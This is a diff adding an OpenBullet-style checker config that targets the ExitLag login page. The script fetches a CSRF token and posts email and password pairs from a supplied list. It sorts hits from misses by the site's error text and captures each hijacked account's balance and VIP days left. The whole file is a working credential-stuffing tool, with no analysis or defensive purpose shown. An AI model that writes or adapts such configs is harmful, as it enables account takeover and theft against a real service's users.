@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "exitlag.",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-18T21:48:21.5960001+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dr.Amr_",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.exitlag.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "name=\"_token\" value=\"" "\"" Recursive=FALSE -> VAR "_token" "" "" 
+REQUEST POST "https://www.exitlag.com/login" AutoRedirect=TRUE 
+  CONTENT "_token=<_token>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "These credentials do not match our records." 
+  KEYCHAIN Success OR 
+    KEY "Balance change" 
+PARSE "<SOURCE>" LR "src=\"/img/current-ballance-icon.svg\"/>" "<" Recursive=FALSE -> CAP "Current balance" "" "" 
+PARSE "<SOURCE>" LR "src=\"/img/vip-days-icon.svg\"/>" "<" Recursive=FALSE -> CAP "VIP days left" "" "" 
